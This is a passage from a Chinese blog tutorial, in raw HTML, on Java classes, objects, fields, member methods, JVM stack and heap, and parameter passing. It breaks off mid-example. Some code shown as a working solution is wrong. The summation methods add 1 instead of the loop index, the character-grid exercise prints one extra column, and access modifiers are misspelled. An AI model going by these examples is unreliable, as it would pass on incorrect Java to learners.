class="hljs-keyword">class</span> <span class="hljs-title class_">cat</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">// //纯变量实现=&gt;不利于数据的管理</span><br><span class="hljs-comment">// //第一只猫</span><br><span class="hljs-comment">// String cat1name = &quot;小白&quot;;</span><br><span class="hljs-comment">// int cat1age = 3;</span><br><span class="hljs-comment">// String cat1color = &quot;白色&quot;;</span><br><span class="hljs-comment">// //第二只猫</span><br><span class="hljs-comment">// String cat2name = &quot;小花&quot;;</span><br><span class="hljs-comment">// int cat2age = 100;</span><br><span class="hljs-comment">// String cat2color = &quot;花色&quot;;</span><br><br><span class="hljs-comment">// //数组=&gt;（1）数据类型提现不出来（2）只能通过[下标]获取信息，造成变量名字和内容</span><br><span class="hljs-comment">// //的对应关系不明确 （3）不能提现猫的行为</span><br><span class="hljs-comment">// String[] cat1 = &#123;&quot;小白&quot;,&quot;3&quot;,&quot;白色&quot;&#125;;</span><br><span class="hljs-comment">// String[] cat2 = &#123;&quot;小花&quot;,&quot;100&quot;,&quot;白色&quot;&#125;;</span><br><br><span class="hljs-comment">//oop面向对象解决</span><br><span class="hljs-comment">//实例化一只猫[创建猫对象]</span><br><span class="hljs-type">Cat</span> <span class="hljs-variable">cat1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(); <span class="hljs-comment">//cat1就是一个对象</span><br>cat1.name = <span class="hljs-string">&quot;小白&quot;</span>;<br>cat1.age = <span class="hljs-number">3</span>;<br>cat1.color = <span class="hljs-string">&quot;白色&quot;</span>;<br><br><span class="hljs-type">Cat</span> <span class="hljs-variable">cat2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(); <span class="hljs-comment">//cat2也是一个对象（猫对象）</span><br>cat2.name = <span class="hljs-string">&quot;小花&quot;</span>;<br>cat2.age = <span class="hljs-number">100</span>;<br>cat2.color = <span class="hljs-string">&quot;花色&quot;</span>;<br><br><span class="hljs-comment">//访问对象属性</span><br>System.out.println(<span class="hljs-string">&quot;第一只猫的信息&quot;</span>+cat1.name+<span class="hljs-string">&quot; &quot;</span>+cat1.age+<span class="hljs-string">&quot; &quot;</span>+cat1.color);<br>System.out.println(<span class="hljs-string">&quot;第二只猫的信息&quot;</span>+cat2.name+<span class="hljs-string">&quot; &quot;</span>+cat2.age+<span class="hljs-string">&quot; &quot;</span>+cat2.color);<br><br><br>&#125;<br>&#125;<br><span class="hljs-comment">//使用面向对象的方式来解决养猫</span><br><span class="hljs-comment">//定义一个猫类-》cat</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span>&#123;<br>String name;<br><span class="hljs-type">int</span> age;<br>String color;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出为</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">第一只猫的信息小白<span class="hljs-number"> 3 </span>白色<br>第二只猫的信息小花<span class="hljs-number"> 100 </span>花色<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220520110119802.png" alt="image-20220520110119802"></p><p>创建对象的方式：</p><p>1）先声明再创建</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Cat cat;<span class="hljs-comment">//声明对象</span><br>cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(); <span class="hljs-comment">//创建</span><br></code></pre></td></tr></table></figure><p>2）直接创建</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Cat</span> <span class="hljs-variable">cat</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br></code></pre></td></tr></table></figure><h2 id="2-属性"><a href="#2-属性" class="headerlink" title="2.属性"></a>2.属性</h2><p>从概念或叫法上看，**成员变量&#x3D;属性&#x3D;field(字段)**。</p><p>例如Car(name,price,color)</p><p><strong>属性是类的一个组成部分</strong>，一般是基本数据类型，也可以是引用类型(对象，数组)</p><p>属性的定义语法同变量：<strong>访问修饰符 属性类型 属性名</strong>;</p><p>访问修饰符【作用是控制方法使用的范围，如果不写默认访问】：<strong>pubic、proctected、默认、private</strong>。</p><h2 id="3-类与对象的内存分配机制"><a href="#3-类与对象的内存分配机制" class="headerlink" title="3.类与对象的内存分配机制"></a>3.类与对象的内存分配机制</h2><blockquote><p>我们看看下面一段代码：</p><p>Person p1&#x3D;new Person();</p><p>p1.age&#x3D;10；</p><p>p1.name＝＂小明＂；</p><p>Person p2＝p1；／&#x2F;把p1 赋给了 p2</p><p>System.out.println（p2.age）；</p><p>请问：p2.age究竟是多少?并画出内存图。</p></blockquote><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220521114502320.png" alt="image-20220521114502320"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">propertiesDetail</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>p1.age = <span class="hljs-number">10</span>;<br>p1.name = <span class="hljs-string">&quot;小明&quot;</span>;<br><span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> p1;<br>System.out.println(p2.age);<br><br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>String name;<br><span class="hljs-type">int</span> age;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果为10。</p><ul><li><p><strong>java内存的结构分析</strong></p><ol><li>栈：一般存放基本数据类型（局部变量）。</li><li>堆：存放对象（Cat cat,数组等）</li><li>方法区：常量池（常量，比如字符串），类加载信息</li><li>[Cat (name,age,price)]</li></ol></li><li><p><strong>java创建对象的流程</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Person p=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>;<br>p.name = <span class="hljs-string">&quot;jack&quot;</span>;<br>p.age = <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure><ol><li><strong>先加载Person类信息</strong>（属性和方法信息，只会加载一次）</li><li><strong>在堆中分配空间</strong>，进行默认初始化（看规则）</li><li>把<strong>地址赋给p</strong>，p就指向对象。</li><li>进行<strong>指定初始化</strong>。比如p.name &#x3D; “jack”</li></ol></li></ul><h2 id="4-成员方法"><a href="#4-成员方法" class="headerlink" title="4.成员方法"></a>4.成员方法</h2><p>快速入门：</p><p>1）添加speak成员方法，输出“我是一个好人”</p><p>2）添加cal01 成员方法，可以计算从1＋．.＋1000的结果</p><p>3）添加cal02成员方法，该方法可以接收一个数n，计算从1＋．.＋n的结果</p><p>4）添加getSum成员方法，可以计算两个数的和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">method01</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//方法使用</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>p1.speak();<br>p1.cal01();<br>p1.cal02(<span class="hljs-number">5</span>);<br><span class="hljs-comment">//把方法getSum返回的值，赋给变量returnRes</span><br><span class="hljs-type">int</span> <span class="hljs-variable">returnRes</span> <span class="hljs-operator">=</span> p1.getSum(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>);<br>System.out.println(<span class="hljs-string">&quot;getSum方法返回的值=&quot;</span>+returnRes);<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>String name;<br><span class="hljs-type">int</span> age;<br><span class="hljs-comment">//方法（成员方法</span><br><span class="hljs-comment">//1.public表示方法是公开的</span><br><span class="hljs-comment">//2.void表示方法无返回值</span><br><span class="hljs-comment">//3.speak()，speak是方法名，()是行参列表</span><br><span class="hljs-comment">//4.&#123;&#125;方法体，可以写我们要执行的代码</span><br><span class="hljs-comment">//5.System.out.println(&quot;我是一个好人&quot;); 表示我们的方法就是输出一句话</span><br><br><span class="hljs-comment">//1）添加speak成员方法，输出“我是一个好人”</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">speak</span><span class="hljs-params">()</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;我是一个好人&quot;</span>);<br>&#125;<br><span class="hljs-comment">//2）添加cal01 成员方法，可以计算从1＋．.＋1000的结果</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cal01</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">1000</span>;i++) &#123;<br>res+=<span class="hljs-number">1</span>;<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;cal01计算结果为：&quot;</span>+res);<br>&#125;<br><span class="hljs-comment">//3）添加cal02成员方法，该方法可以接收一个数n，计算从1＋．.＋n的结果</span><br><span class="hljs-comment">//int n表示行参列表，表示当前有一个行参n，可以接受用户输入</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cal02</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span>&#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=n;i++) &#123;<br>res+=<span class="hljs-number">1</span>;<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;cal02计算结果为：&quot;</span>+res);<br>&#125;<br><span class="hljs-comment">//4）添加getSum成员方法，可以计算两个数的和</span><br><span class="hljs-comment">//public int 的int表示方法执行后，返回一个int值</span><br><span class="hljs-comment">//return res 表示把res的值返回。</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getSum</span><span class="hljs-params">(<span class="hljs-type">int</span> num1,<span class="hljs-type">int</span> num2)</span>&#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> num1 + num2;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220524232713435.png" alt="image-20220524232713435"></p><h3 id="jvm的内存分析代码流程"><a href="#jvm的内存分析代码流程" class="headerlink" title="jvm的内存分析代码流程"></a><strong>jvm的内存分析代码流程</strong></h3><p><strong>（分析getsum（）的流程）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//调用</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">int</span> <span class="hljs-variable">returnRes</span> <span class="hljs-operator">=</span> p1.getSum(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>);<br>System.out.println(<span class="hljs-string">&quot;getSum方法返回的值=&quot;</span>+returnRes);<br><br><span class="hljs-comment">//方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getSum</span><span class="hljs-params">(<span class="hljs-type">int</span> num1,<span class="hljs-type">int</span> num2)</span>&#123;<br>  <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> num1 + num2;<br>  <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先在栈中创建一个空间（main栈）。</p><p>执行第一句话<code>Person p1 = new Person();</code>，在堆中创建一个对象。</p><p>执行第二句话<code>int returnRes = p1.getSum(10,20);</code>的时候，会再次创建一个栈（独立的空间，例子中取名为getsum栈，实际上非此名）。</p><p>在getsum栈中，num1指向10（在<code>p1.getSum(10,20)</code> 复制了一份10和20），num2指向20。</p><p><code>int res = num1 + num2;</code>res为30。</p><p><code>return res;</code> 将结果30返回给 <code>int returnRes = p1.getSum(10,20);</code>。</p><p><code>System.out.println(&quot;getSum方法返回的值=&quot;+returnRes);</code> 输出returnRes.</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220524234108116.png" alt="image-20220524234108116" style="zoom:50%;" /><p>小结：</p><ol><li>当程序执行到方法时，就会开辟一个独立空间（栈空间）</li><li>当方法执行完毕，或者执行到return语句时，就会返回</li><li>返回到调用方法的地方</li><li>返回后，继续执行方法后面的代码</li><li>当main方法（栈）执行完毕，整个程序退出</li></ol><p>成员方法的好处：</p><ul><li>提高代码的复用性。</li><li>可以讲实现的细节封装起来，然后供其他用户来调用即可。</li></ul><h3 id="成员方法的定义"><a href="#成员方法的定义" class="headerlink" title="成员方法的定义"></a>成员方法的定义</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> 返回数据类型 方法名（形参列表..)&#123;<br>  <span class="hljs-comment">//方法体</span><br>  语句;<br>  <span class="hljs-keyword">return</span> 返回值;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>形参列表：表示成员方法输入</li><li>返回数据类型：表示成员方法输出，void表示没有返回值</li><li>方法体：表示为了实现某一功能的代码块</li><li>return语句不是必须的</li></ol><h3 id="成员方法的注意事项"><a href="#成员方法的注意事项" class="headerlink" title="成员方法的注意事项"></a>成员方法的注意事项</h3><p><strong>返回类型</strong>：</p><ol><li>一个方法只能有一个返回值（想要多个返回值可以返回数组）</li><li>返回类型可以为任意类型，包括基本类型和引用类型（数组、对象）</li><li>如果方法<strong>要求有返回数据类型</strong>，刚方法体中最后的执行语句<strong>必须为return值</strong>，而且要求返回值类型必须和return的值类型一致或兼容。</li><li>如果方法是void，则方法体中可以没有return，或者只写return。</li></ol><p><strong>形参列表</strong>：</p><ol><li>一个方法可以有0个参数，也可以有多个参数，中间用逗号隔开</li><li>参数类型可以为任意类型，包含基本类型或引用类型。（例如printArr(int[ ] [ ]  map)</li><li>调用带参数的方法时，一定对应着参数列表传入相同类型或兼容类型的参数</li><li>方法定义时的参数称为形式参数（例如n1，n2），简称形参；方法调用时的传入参数称为实际参数（例如1、2），简称实参。实参和形参的类型要一致或兼容、个数、顺序必须一致！</li></ol><p><strong>方法体</strong>：</p><p>完成功能的具体语句（输入、输出、变量、运算、分支、循环、方法调用）但里面不能再定义方法！即：方法不能嵌套定义。</p><p><strong>方法调用</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test1</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>a.sayOK();<br>a.m1();<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;print()方法被调用n=&quot;</span>+n);<br>&#125;<br><span class="hljs-comment">//同类调用</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayOK</span><span class="hljs-params">()</span>&#123;<br>print(<span class="hljs-number">10</span>);<br>System.out.println(<span class="hljs-string">&quot;继续执行sayOK&quot;</span>);<br>&#125;<br><span class="hljs-comment">//跨类调用:通过对象名调用</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m1</span><span class="hljs-params">()</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;m1()方法被调用&quot;</span>);<br><span class="hljs-comment">//创建B对象</span><br><span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>b.hi();<br>System.out.println(<span class="hljs-string">&quot;m1()继续执行&quot;</span>);<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;B类中的hi()被执行&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-09-01%20%E4%B8%8B%E5%8D%883.36.08.png" alt="截屏2022-09-01 下午3.36.08"></p><h3 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h3><p>题目1：</p><blockquote><p>1.编写类AA新方法:判断一个数是奇数odd还是偶数，返回boolean<br>2.根据行、列、字符打印 对应行数和列数的字符，比如：行:4，列：4，字符＃，则打印相应的效果</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test1</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">AA</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AA</span>();<br><span class="hljs-keyword">if</span>(a.isOdd(<span class="hljs-number">1</span>))&#123;<br>System.out.println(<span class="hljs-string">&quot;是奇数&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;是偶数&quot;</span>);<br>&#125;<br>a.print(<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;#&#x27;</span>);<br><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AA</span>&#123;<br><span class="hljs-comment">//思路</span><br><span class="hljs-comment">//1.方法的返回类型 boolean</span><br><span class="hljs-comment">//2.方法的名字 isOdd</span><br><span class="hljs-comment">//3.方法的形参 （int num)</span><br><span class="hljs-comment">//4.方法体，判断</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isOdd</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span>&#123;<br><span class="hljs-comment">// if(num%2 !=0)&#123;</span><br><span class="hljs-comment">// return true;</span><br><span class="hljs-comment">// &#125;else&#123;</span><br><span class="hljs-comment">// return false;</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-keyword">return</span> num % <span class="hljs-number">2</span> != <span class="hljs-number">0</span> ? <span class="hljs-literal">true</span>:<span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-comment">//根据行、列、字符打印 对应行数和列数的字符，比如：行:4，列：4，字符＃，则打印相应的效果</span><br><span class="hljs-comment">//1.方法的返回类型 void</span><br><span class="hljs-comment">//2.方法的名字 print</span><br><span class="hljs-comment">//3.方法的形参 （int row,int col,char c)</span><br><span class="hljs-comment">//4.方法体，循环</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">int</span> row,<span class="hljs-type">int</span> col,<span class="hljs-type">char</span> c)</span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;row;i++)&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=col;j++) &#123;<br>System.out.print(c);<br>&#125;<br>System.out.println();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-09-01%20%E4%B8%8B%E5%8D%884.22.53.png" alt="截屏2022-09-01 下午4.22.53"></p><h2 id="5-成员方法传参机制"><a href="#5-成员方法传参机制" class="headerlink" title="5.成员方法传参机制"></a>5.成员方法传参机制</h2><p>a与b交换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test1</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br><span class="hljs-type">AA</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AA</span>();<br>obj.swap(a,b);<br>System.out.println(<span class="hljs-string">&quot;a=&quot;</span>+a+<span class="hljs-string">&quot; b=&quot;</span>+b);<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AA</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;\na和b交换前的值：\na=&quot;</span>+a+<span class="hljs-string">&quot;\tb=&quot;</span>+b);<br><span class="hljs-type">int</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> a;<br>a = b;<br>b = tmp;<br>System.out.println(<span class="hljs-string">&quot;\na和b交换后的值：\na=&quot;</span>+a+<span class="hljs-string">&quot;\tb=&quot;</span>+b);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-09-01%20%E4%B8%8B%E5%8D%884.48.14.png" alt="截屏2022-09-01 下午4.48.14"></p><p>类是值传递，main的a和b的值传递进了swap栈，swap栈内a、b的改变并不会影响main。</p><ul><li><strong>基本数据类型，传递的是值（值拷贝），形参的任何改变不影响实参。</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test1</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br><span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>b.test100(arr);<br>System.out.println(<span class="hljs-string">&quot;main100的arr数组:&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++ ) &#123;<br>System.out.print(arr[i]+<span class="hljs-string">&quot;\t&quot;</span>);<br>&#125;<br>System.out.println();<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test100</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr)</span>&#123;<br>arr[<span class="hljs-number">0</span>] = <span class="hljs-number">200</span>;<br><span class="hljs-comment">//遍历数组</span><br>System.out.println(<span class="hljs-string">&quot;test100的arr数组:&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++ ) &#123;<br>System.out.print(arr[i]+<span 